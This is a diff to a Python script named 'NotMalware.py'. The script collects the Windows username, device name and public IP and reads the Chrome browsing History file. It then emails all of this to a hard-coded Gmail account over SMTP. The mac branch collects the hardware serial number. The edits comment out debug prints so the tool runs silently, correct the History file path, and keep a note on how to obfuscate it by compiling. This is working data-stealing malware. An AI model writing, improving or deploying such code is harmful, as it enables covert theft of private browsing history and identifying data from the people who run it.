@@ -8,6 +8,7 @@ import subprocess
 import os
 import socket
 import getpass
+import time
 from email.message import EmailMessage
 from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
@@ -17,8 +18,9 @@ from shutil import copyfile
 
 
 
+
 ##To Obfuscate: python3.8 -OO -m py_compile NotMalware.py
-print('hi')
+#print('hi')
 def main(platform):
     def windows():
         p = subprocess.Popen("whoami", stdout=subprocess.PIPE, shell=True)
@@ -28,18 +30,18 @@ def main(platform):
         p_status = p.wait()
 
         whoami = str(whoami)
-        print(whoami)
+        #print(whoami)
         whoami = whoami.replace('\\n', '\n')
         whoami = whoami.replace('\\r', '')
         whoami = whoami.replace("b'", '')
         whoami = whoami.replace("'", '')
-        print(whoami)
+        #print(whoami)
         w1 = whoami.find('\\')
         username = (whoami[w1::]).replace('\\','')
         device = whoami[:w1]
-        print(w1)
+        #print(w1)
         info = f'Windows device info from Device name: {device} and username: {username}'
-        print(info)
+        #print(info)
 #--------------------------------------------------------------------------------------
 
         p = subprocess.Popen("nslookup myip.opendns.com resolver1.opendns.com", stdout=subprocess.PIPE, shell=True)
@@ -73,42 +75,53 @@ def main(platform):
         #print(copydata)
 #-----------------------------------------------------------------------------------------------------
 
-        msg = EmailMessage()
-        msg.set_content(message)
+        msg = MIMEMultipart()
 
         msg['Subject'] = info
         msg['From'] = "SVBBZGRy@gmail.com"
         msg['To'] = "SVBBZGRy@gmail.com"
+        body = message
+        msg.attach(MIMEText(body, 'plain'))
+        
         filename = "History"
-        attachment = open("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History" "C:\\Users\\User\\Dropbox\\TUFMV0FS\\TestingArea", "rb")
+        attachment = open("C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", "rb")
         
         # instance of MIMEBase and named as p 
         p = MIMEBase('application', 'octet-stream') 
         
         # To change the payload into encoded form 
         p.set_payload((attachment).read()) 
-        
+
+        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+        server.login("SVBBZGRy@gmail.com", "SVBBZGRy")
         # encode into base64 
         encoders.encode_base64(p) 
         
         p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
-        
-        # attach the instance 'p' to instance 'msg' 
-        msg.attach(p) 
-        # Add attachment to message and convert message to string
         msg.attach(p)
-        # Add HTML/plain-text parts to MIMEMultipart message
-        # The email client will try to render the last part first
+       
 
-        # Send the message via our own SMTP server.
-        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-        server.login("SVBBZGRy@gmail.com", "SVBBZGRy")
+        # attach the instance 'p' to instance 'msg' 
+        
+        # Add attachment to message and convert message to string
         server.send_message(msg)
+        '''
+        while True:
+            for cursor in '\\|/-':
+                time.sleep(0.1)
+                # Use '\r' to move cursor back to line beginning
+                # Or use '\b' to erase the last character
+                sys.stdout.write('\r{}'.format(cursor))
+                # Force Python to write data into terminal.
+                sys.stdout.flush()
+        '''        
+        
+        
         server.quit()
         #dir *Program.py /s
         #C: \Users\User\AppData\Local\Google\Chrome\User Data\Default
         #cd %APPDATA%\Local\Google\Chrome\User Data\Default
-#win part end
+#win part end/////////////////////////////////////////////////////////////////////////////////////////////
 
     def mac():
         cmd = "system_profiler SPHardwareDataType | grep 'Serial Number' | awk '{print $4}'" ##Cmd to get priv IP   
@@ -134,10 +147,11 @@ def main(platform):
                 pass
         
     if platform == "linux" or platform == "linux2":
-        print('linux')
+        #print('linux')
         exit()
     elif platform == "Darwin":
         mac()
     elif platform == "win32" or platform == "Windows":
-        print('windows')
+        #print('windows')
         windows()
+
